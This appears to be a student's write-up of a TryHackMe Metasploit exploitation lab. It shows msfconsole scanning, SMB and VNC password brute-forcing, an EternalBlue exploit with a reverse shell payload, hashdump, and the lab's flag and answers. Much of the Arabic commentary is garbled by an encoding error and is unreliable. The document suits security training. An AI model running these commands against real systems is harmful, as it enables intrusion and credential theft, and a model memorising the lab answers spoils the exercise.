# Metasploit: Exploitation


<img width="1904" height="376" alt="image" src="https://github.com/user-attachments/assets/5993e6a0-604f-4381-98a9-70cc7fba04df" />



<details>
  <summary>introduction</summary>


In this room, we will learn how to useÂ MetasploitÂ for vulnerability scanning and exploitation. We will also cover how the database feature makes it easier to manage penetration testing engagements with a broader scope.Â Finally, we will look at generating payloads withÂ msfvenomÂ and how to start aÂ MeterpreterÂ session on most target platforms.

More specifically, the topics we will cover are:

-   How to scan target systems usingÂ Metasploit.
-   How to use theÂ MetasploitÂ database feature.
-   How to useÂ MetasploitÂ to conduct a vulnerability scan.
-   How to useÂ MetasploitÂ to exploit vulnerable services on target systems.
-   HowÂ `msfvenomÂ `can be used to create payloads and obtain a Meterpreter session on the target system.

Please note that for all questions that require using a wordlist (e.g brute-force attacks), we will be using the wordlist on the AttackBox found atÂ the following path:

`/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`Â 

If you opt to use your own machine, please download the wordlist by clicking the Download Task Files button to the right.

Start the AttackBox and run Metasploit using theÂ `msfconsole`Â command to follow along with this room.


  
</details>


<details>
  <summary>Scanning</summary>


```ruby
search portscan
```

<img width="1162" height="391" alt="image" src="https://github.com/user-attachments/assets/8840ce81-dd25-49e5-b764-9e179759bb97" />


```ruby
use 5
show options
```

<img width="995" height="398" alt="image" src="https://github.com/user-attachments/assets/bade2253-7d59-4c62-9851-8d438bb8e180" />

-   **CONCURRENCY:Â **Number of targets to be scanned simultaneously.
-   **PORTS:Â **Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
-   **RHOSTS:**Â Target or target network to be scanned.
-   **THREADS:**Â Number of threads that will be used simultaneously. More threads will result in faster scans.



### You can directly perform Nmap scans from the msfconsole prompt as shown below faster:

```ruby
msf6 > nmap -sS 10.10.12.229
```

<img width="883" height="315" alt="image" src="https://github.com/user-attachments/assets/1eb3e965-a4af-4b66-81e8-70770923ceac" />


**UDP service Identification**

TheÂ `scanner/discovery/udp_sweep`Â module will allow you to quickly identify services running over theÂ UDPÂ (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possibleÂ UDPÂ services but does provide a quick way to identify services such as DNS or NetBIOS.


```
use scanner/discovery/udp_sweep
set RHOSTS 10.64.151.9
run
```

<img width="1326" height="206" alt="image" src="https://github.com/user-attachments/assets/6ff4d33c-35f0-4553-804e-07e7d89db381" />


**SMB Scans**

Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would beÂ `smb_enumshares`Â andÂ `smb_version`Â but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```
use scanner/smb/smb_version
set RHOSTS 10.64.151.9
run
```

<img width="1297" height="147" alt="image" src="https://github.com/user-attachments/assets/37ed4a68-789c-4a7d-8936-d06992139639" />

----
---
---



```
use netbios/nbname
set RHOSTS 10.64.151.9
run
```

<img width="1266" height="142" alt="image" src="https://github.com/user-attachments/assets/9bd47138-d028-4842-8d34-661b408ec14b" />

```
use scanner/http/http_version
set RHOSTS 10.64.151.9
set RPORT 8000
RUN
```

<img width="823" height="109" alt="image" src="https://github.com/user-attachments/assets/a0a2fe4b-0a3f-455b-8e93-304935f90522" />

```
use smb_login
set RHOSTS 10.64.151.9
set SMBUser penny
set PASS_FILE /home/kali/tryhackme/metasploit/passwords.txt
set STOP_ON_SUCCESS true
```

<img width="1081" height="426" alt="image" src="https://github.com/user-attachments/assets/7d132043-7edf-460f-bd1e-84da2bfd7370" />

<img width="1054" height="319" alt="image" src="https://github.com/user-attachments/assets/2359768b-04c3-42bc-ab6a-f47c37f269bf" />






<img width="1623" height="596" alt="image" src="https://github.com/user-attachments/assets/c05b9d7b-2a6e-4961-aaf6-f2d2d9800d09" />







  
</details>









<details>
  <summary>The Metasploit Database</summary>



```
systemctl start postgresql
systemctl status postgresql
sudo -u postgres msfdb init
```

<img width="1330" height="334" alt="image" src="https://github.com/user-attachments/assets/91f091b6-a913-40d5-bf63-c3d40326f8e7" />

```
db_status
```


<img width="795" height="95" alt="image" src="https://github.com/user-attachments/assets/0574a62f-ce77-48ce-a734-d16a8f2f52d4" />



ğŸ”¹ Ø¥Ø¹Ø¯Ø§Ø¯ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Metasploit
--------------------------------

### `systemctl start postgresql`

ğŸ“Œ ÙŠØ´ØºÙ‘Ù„ Ø®Ø¯Ù…Ø© PostgreSQL\
â¡ï¸ Metasploit Ù…Ø­ØªØ§Ø¬Ù‡Ø§ Ø¹Ø´Ø§Ù† ÙŠØ®Ø²Ù‘Ù†:

-   Hosts

-   Services

-   Creds

-   Vulns

* * * * *

### `sudo -u postgres msfdb init`

ğŸ“Œ ÙŠÙ‡ÙŠÙ‘Ø£ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Metasploit\
âœ”ï¸ ÙŠÙ†Ø´Ø¦ DB\
âœ”ï¸ ÙŠØ¶Ø¨Ø· Users\
âœ”ï¸ ÙŠØ±Ø¨Ø· Metasploit Ø¨Ø§Ù„Ù€ PostgreSQL

âŒ Ù„Ø§ ÙŠØ¹Ù…Ù„ ÙƒÙ€ root\
âœ… Ù„Ø§Ø²Ù… postgres user

* * * * *

### `msfdb delete`

ğŸ“Œ ÙŠÙ…Ø³Ø­ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª\
â¡ï¸ ØªØ³ØªØ®Ø¯Ù…Ù‡ Ù„Ùˆ Ù‡ØªØ¨Ø¯Ø£ Ù…Ù† Ø§Ù„ØµÙØ±

* * * * *

ğŸ”¹ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø¯Ø§ØªØ§Ø¨ÙŠØ²
---------------------------

### `db_status`

ğŸ“Œ ÙŠØªØ£ÙƒØ¯ Ø¥Ù† Metasploit Ù…ØªØµÙ„ Ø¨Ø§Ù„Ø¯Ø§ØªØ§Ø¨ÙŠØ²\
âœ… Connected = ØªÙ…Ø§Ù…\
âŒ Disconnected = Ù…Ø´ÙƒÙ„Ø©

* * * * *

ğŸ”¹ Workspaces (ØªÙ†Ø¸ÙŠÙ… Ø§Ù„Ø´ØºÙ„)
---------------------------

### `workspace`

ğŸ“Œ ÙŠØ¹Ø±Ø¶ ÙƒÙ„ Ø§Ù„Ù€ workspaces\
â­ Ø§Ù„Ù†Ø¬Ù…Ø© = workspace Ø§Ù„Ø­Ø§Ù„ÙŠ

* * * * *

### `workspace -a tryhackme`

ğŸ“Œ Ø¥Ù†Ø´Ø§Ø¡ workspace Ø¬Ø¯ÙŠØ¯\
â¡ï¸ Ù…ÙÙŠØ¯ ØªÙØµÙ„ ÙƒÙ„ Target Ø¹Ù† Ø§Ù„ØªØ§Ù†ÙŠ

* * * * *

### `workspace tryhackme`

ğŸ“Œ Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨ÙŠÙ† workspaces

* * * * *

### `workspace -d tryhackme`

ğŸ“Œ Ø­Ø°Ù workspace

* * * * *

ğŸ”¹ ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒØ© ÙˆØªØ®Ø²ÙŠÙ† Ø§Ù„Ù†ØªØ§Ø¦Ø¬
----------------------------

### `db_nmap -sV -p- <IP>`

ğŸ“Œ ÙŠØ¹Ù…Ù„ nmap\
ğŸ“Œ **ÙˆÙŠØ­ÙØ¸ Ø§Ù„Ù†ØªÙŠØ¬Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙÙŠ Ø§Ù„Ø¯Ø§ØªØ§Ø¨ÙŠØ²**\
âœ”ï¸ Ports\
âœ”ï¸ Services\
âœ”ï¸ OS info

* * * * *

ğŸ”¹ Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø©
-----------------------

### `hosts`

ğŸ“Œ ÙŠØ¹Ø±Ø¶ ÙƒÙ„ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù„ÙŠ Ø§ØªÙØ­ØµØª

* * * * *

### `services`

ğŸ“Œ ÙŠØ¹Ø±Ø¶ ÙƒÙ„ Ø§Ù„Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù…ÙØªÙˆØ­Ø©\
(HTTP / SMB / FTP / SSH / RDP...)

* * * * *

### `services -S smb`

ğŸ“Œ Ø¨Ø­Ø« Ø¹Ù† Service Ù…Ø¹ÙŠÙ‘Ù†Ø©\
â¡ï¸ Ù…ÙÙŠØ¯ ØªØ¹Ø±Ù attack surface Ø¨Ø³Ø±Ø¹Ø©

* * * * *

ğŸ”¹ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
----------------------------

### `hosts -R`

ğŸ“Œ ÙŠØ­Ø· ÙƒÙ„ Ø§Ù„Ù€ hosts ÙÙŠ:

RHOSTS

â¡ï¸ Ù…Ù† ØºÙŠØ± Ù…Ø§ ØªÙƒØªØ¨ IP ÙŠØ¯ÙˆÙŠ

* * * * *

ğŸ”¹ Ù…Ø«Ø§Ù„ Ø¹Ù„Ù‰ ÙØ­Øµ Ø«ØºØ±Ø©
--------------------

### `use auxiliary/scanner/smb/smb_ms17_010`

ğŸ“Œ ÙØ­Øµ Ø«ØºØ±Ø© EternalBlue

* * * * *

### `show options`

ğŸ“Œ ØªØªØ£ÙƒØ¯ ÙƒÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ØµØ­ Ù‚Ø¨Ù„ Ø§Ù„ØªØ´ØºÙŠÙ„

* * * * *

### `run`

ğŸ“Œ ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…ÙˆØ¯ÙŠÙˆÙ„\
ğŸ“Œ Ù„Ùˆ Vulnerable â†’ ØªØ¹Ø±Ù ÙÙˆØ±Ù‹Ø§

* * * * *

ğŸ”¹ Ø£ÙˆØ§Ù…Ø± Ù…Ø³Ø§Ø¹Ø¯Ø© Ù…Ù‡Ù…Ù‘Ø©
---------------------

| Ø§Ù„Ø£Ù…Ø± | Ø§Ù„ÙØ§ÙŠØ¯Ø© |
| --- | --- |
| `hosts -h` | ÙƒÙ„ Ø§Ø®ØªÙŠØ§Ø±Ø§Øª hosts |
| `services -h` | ÙƒÙ„ Ø§Ø®ØªÙŠØ§Ø±Ø§Øª services |
| `workspace -h` | Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù€ workspaces |
| `loot` | Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø³Ø±ÙˆÙ‚Ø© |
| `creds` | ÙŠÙˆØ²Ø±Ø§Øª ÙˆØ¨Ø§Ø³ÙˆØ±Ø¯Ø§Øª |
| `vulns` | Ø§Ù„Ø«ØºØ±Ø§Øª |











  
</details>






<details>
  <summary>Vulnerability Scanning</summary>



ğŸªœ ÙŠØ¹Ù†ÙŠ Ø¥ÙŠÙ‡ Low Hanging FruitØŸ
------------------------------

**Low hanging fruit** =\
Ø«ØºØ±Ø§Øª:

-   Ø³Ù‡Ù„Ø© Ø§Ù„Ø§ÙƒØªØ´Ø§Ù

-   Ø³Ù‡Ù„Ø© Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„

-   Ù…Ù…ÙƒÙ† ØªØ¯ÙŠÙƒ Access Ø³Ø±ÙŠØ¹ (User / Admin / Root)

ğŸ“Œ Ù…Ø«Ø§Ù„:

-   Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø¶Ø¹ÙŠÙ

-   Login Ø¨Ø¯ÙˆÙ† Authentication

-   Service Ø´ØºØ§Ù„ Ø¨Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§ÙØªØ±Ø§Ø¶ÙŠØ©

* * * * *

ğŸ§  Metasploit Ø¨ÙŠØ³Ø§Ø¹Ø¯Ùƒ Ø¥Ø²Ø§ÙŠØŸ
---------------------------

Metasploit **Ù…Ø´ Ø³Ø­Ø±**\
Ù‡Ùˆ Ø¨ÙŠØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰:\
1ï¸âƒ£ Ø§Ù†Øª ÙØ­ØµØª Ø§Ù„Ù‡Ø¯Ù ØµØ­\
2ï¸âƒ£ Ø¹Ø±ÙØª Services Ø´ØºØ§Ù„Ø© Ø¥ÙŠÙ‡\
3ï¸âƒ£ Ø¨Ø¹Ø¯Ù‡Ø§ ØªØ®ØªØ§Ø± Module Ù…Ù†Ø§Ø³Ø¨

ÙƒÙ„ Ù…Ø§ Ø§Ù„Ù€ fingerprinting Ø£Ø­Ø³Ù† â†’ ÙØ±Øµ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø£ÙƒØªØ±

* * * * *

ğŸ” Ù…Ø«Ø§Ù„ Ø¹Ù…Ù„ÙŠ: VNC
-----------------

Ù„Ùˆ Ø§ÙƒØªØ´ÙØª:

5900/tcp open  vnc

Ø¯Ù‡ Ù…Ø¹Ù†Ø§Ù‡:

-   Remote Desktop

-   Ø§Ø­ØªÙ…Ø§Ù„:

    -   Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø¶Ø¹ÙŠÙ

    -   No Authentication

    -   Default creds

* * * * *

ğŸ” Ù†Ø¨Ø­Ø« Ø¹Ù† Modules
------------------

search vnc

Ø£Ùˆ:

use auxiliary/scanner/vnc/

Ù‡ÙŠØ·Ù„Ø¹Ù„Ùƒ:

-   `vnc_login` â†’ brute force

-   `vnc_none_auth` â†’ Ø¨Ø¯ÙˆÙ† Ø¨Ø§Ø³ÙˆØ±Ø¯

-   `ard_root_pw` â†’ Ù‚Ø¯ÙŠÙ… ÙˆØ®Ø·ÙŠØ±

* * * * *

ğŸ”‘ Module Ù…Ù‡Ù…: vnc_login
------------------------

use auxiliary/scanner/vnc/vnc_login

Ø¯Ù‡ Ø¨ÙŠØ¹Ù…Ù„:

-   ØªØ¬Ø±Ø¨Ø© Ø¨Ø§Ø³ÙˆØ±Ø¯Ø§Øª

-   ÙŠÙ„Ù‚Ø· Creds Ù„Ùˆ Ù„Ù‚Ø§Ù‡Ø§

* * * * *

â„¹ï¸ info command
---------------

info

Ø¯Ù‡ ÙŠÙ‚ÙˆÙ„Ùƒ:

-   Ø§Ù„Ù…ÙˆØ¯ÙŠÙˆÙ„ Ø¨ÙŠØ¹Ù…Ù„ Ø¥ÙŠÙ‡

-   Ø¨ÙŠØ³ØªÙ‡Ø¯Ù Ø¥ÙŠÙ‡

-   Ø§Ù„Ø®ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©

ğŸ“Œ ÙˆØ¯Ù‡ Ù…Ù‡Ù… Ø¬Ø¯Ù‹Ø§ Ù‚Ø¨Ù„ Ø£ÙŠ run

* * * * *

âš™ï¸ Ø£Ù‡Ù… Options (Ø¨Ø§Ù„Ø¹Ù‚Ù„)
-----------------------

| Option | ÙØ§ÙŠØ¯ØªÙ‡ |
| --- | --- |
| RHOSTS | Ø§Ù„Ù€ IP |
| RPORT | ØºØ§Ù„Ø¨Ù‹Ø§ 5900 |
| PASS_FILE | wordlist |
| STOP_ON_SUCCESS | ÙŠÙ‚Ù Ø£ÙˆÙ„ Ù…Ø§ ÙŠÙ†Ø¬Ø­ |
| THREADS | Ø§Ù„Ø³Ø±Ø¹Ø© |

* * * * *

ğŸš€ Ù…Ø«Ø§Ù„ ØªØ´ØºÙŠÙ„
-------------

set RHOSTS 10.10.10.10\
set PASS_FILE /usr/share/wordlists/rockyou.txt\
set STOP_ON_SUCCESS true\
run

âœ”ï¸ Ù„Ùˆ Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø¶Ø¹ÙŠÙ â†’ Ø¯Ø®Ù„Øª\
âœ”ï¸ foothold Ø³Ø±ÙŠØ¹ âœ”ï¸

* * * * *

ğŸ§  Ø§Ù„ÙÙƒØ±Ø© ÙƒÙ„Ù‡Ø§
--------------

Metasploit:

-   Ù…Ø´ Ø¨ÙŠØ®ØªØ±Ø¹ Ø«ØºØ±Ø§Øª

-   Ø¨ÙŠØ³ØªØºÙ„ **Ø§Ù„Ù„ÙŠ Ø§Ù†Øª Ø§ÙƒØªØ´ÙØªÙ‡**

ğŸ” Flow Ø§Ù„ØµØ­:

Scan â†’ Identify Service â†’ Search Module â†’ Info â†’ Configure â†’ Run

* * * * *

âœ¨ Ø§Ù„Ø®Ù„Ø§ØµØ©
---------

-   Low hanging fruit = Ø£Ø³Ù‡Ù„ Ø·Ø±ÙŠÙ‚ Ù„Ù„Ø¯Ø®ÙˆÙ„

-   Services Ø²ÙŠ:

    -   VNC

    -   FTP

    -   SMB

    -   HTTP

-   Ø¯Ø§ÙŠÙ…Ù‹Ø§ Ø¯ÙˆØ± Ø¹Ù„Ù‰:

    -   Scanner modules Ù‚Ø¨Ù„ exploits

-   `info` = ØµØ¯ÙŠÙ‚Ùƒ







---
---
---





```
search smtp open
use auxiliary/scanner/smtp/smtp_relay
info
```

<img width="1097" height="639" alt="image" src="https://github.com/user-attachments/assets/0a44b045-e6ef-4200-8d60-7b91daf29e3f" />


```
Campbell Murray
```





  
</details>






<details>
  <summary>Exploitation</summary>


```
use windows/smb/ms17_010_eternalblue
show payloads
set payload 3 (payload/generic/shell_reverse_tcp  )
```

<img width="1014" height="680" alt="image" src="https://github.com/user-attachments/assets/c58ee5c6-c338-4093-982e-49f1a19300e2" />

```
show options
set rhosts 10.64.145.119
run
```

<img width="1014" height="680" alt="image" src="https://github.com/user-attachments/assets/ddf1d71b-50a6-4564-a6d2-9576f737ed01" />


<img width="1155" height="690" alt="image" src="https://github.com/user-attachments/assets/722bde91-5c79-4a40-95cb-453e267daa26" />


```
Ctrl  +  Z
sessoins
```

<img width="1435" height="451" alt="image" src="https://github.com/user-attachments/assets/1184f7bd-5105-4167-a16c-844070d541bb" />



```
sessions -h 
```



<img width="1383" height="851" alt="image" src="https://github.com/user-attachments/assets/2dcc2bca-32f4-4310-b083-1572ff7b7e4a" />


```
sessions -u 2
sessions
sessions -i 3
hashdump
```


<img width="1212" height="659" alt="image" src="https://github.com/user-attachments/assets/f99c849c-1350-4aa4-ac0e-4952465f1484" />


```
search -f flag.txt
```


<img width="825" height="317" alt="image" src="https://github.com/user-attachments/assets/56eae838-d597-40bd-8be4-480faf693bac" />



```
c:\Users\Jon\Documents\flag.txt
```

<img width="681" height="113" alt="image" src="https://github.com/user-attachments/assets/f3d2473d-64f3-4850-959b-3e4ff791d363" />


```
THM-5455554845 
```


  
</details>






<details>
  <summary>Msfvenom</summary>

















  
</details>















































